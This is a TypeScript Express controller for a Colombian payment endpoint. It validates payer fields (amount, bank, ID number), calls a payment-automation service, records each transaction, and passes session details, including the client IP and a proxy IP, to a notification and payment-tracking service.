import { Request, Response } from 'express';
import { executeFill } from '../services/fill.service';
import { notifySessionPayment } from './track.controller';
import { startTrackingBoldPayment } from '../services/bold-tracker.service';
import { getGatewaySettings, recordTransaction } from '../services/settings.service';

export async function postFill(req: Request, res: Response) {
  const { monto, banco, tipo, doc, nombre, email, celular, sessionId } = req.body ?? {};
  const cleanMonto = String(monto || '').replace(/\D/g, '');
  const cleanDoc = String(doc || '').replace(/\D/g, '');
  const sid = String(sessionId || 'anon');
  const settings = getGatewaySettings();

  try {
    if (!monto || !banco || !tipo || !doc) {
      return res.status(400).json({
        error: 'Faltan campos requeridos: monto, banco, tipo, doc',
      });
    }

    if (!cleanMonto || Number(cleanMonto) < 10000) {
      return res.status(400).json({ error: 'El monto mínimo a pagar es de $10.000 COP' });
    }
    if (!cleanDoc) {
      return res.status(400).json({ error: 'Documento inválido' });
    }

    const result = await executeFill({
      monto: cleanMonto,
      banco: String(banco).trim(),
      tipo: String(tipo).trim(),
      doc: cleanDoc,
      nombre: nombre ? String(nombre).trim() : undefined,
      email: email ? String(email).trim() : undefined,
      celular: celular ? String(celular).trim() : undefined,
    });

    recordTransaction({
      referenceId: result.reference_id,
      sessionId: sid,
      nombre: String(nombre || 'No provisto').trim(),
      doc: cleanDoc,
      banco: String(banco).trim(),
      monto: Number(cleanMonto),
      gateway: settings.gatewayProvider,
      status: 'GENERATED',
      redirectUrl: result.redirect_url,
    });

    if (result.redirect_url) {
      const clientIp =
        (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
      const host = (req.headers['x-forwarded-host'] as string) || req.headers.host || '';
      notifySessionPayment(sid, {
        nombre: String(nombre || 'No provisto').trim(),
        monto: cleanMonto,
        cc: cleanDoc,
        banco: String(banco).trim(),
        url: result.redirect_url,
        proxyIp: result.proxy_ip,
        clientIp,
        host,
        gateway: settings.gatewayProvider,
      });

      if (result.reference_id) {
        startTrackingBoldPayment({
          referenceId: result.reference_id,
          sessionId: sid,
          amount: Number(cleanMonto),
          banco: String(banco).trim(),
          nombre: String(nombre || '').trim(),
          doc: cleanDoc,
        });
      }
    }

    return res.json(result);
  } catch (err: any) {
    console.error('Error en /api/fill:', err);
    recordTransaction({
      sessionId: sid,
      nombre: String(nombre || 'No provisto').trim(),
      doc: cleanDoc,
      banco: String(banco || '').trim(),
      monto: Number(cleanMonto || 0),
      gateway: settings.gatewayProvider,
      status: 'ERROR',
      errorMessage: err.message || 'Error en pasarela',
    });
    return res.status(500).json({
      error: err.message || 'Error al procesar la automatización de pago',
    });
  }
}
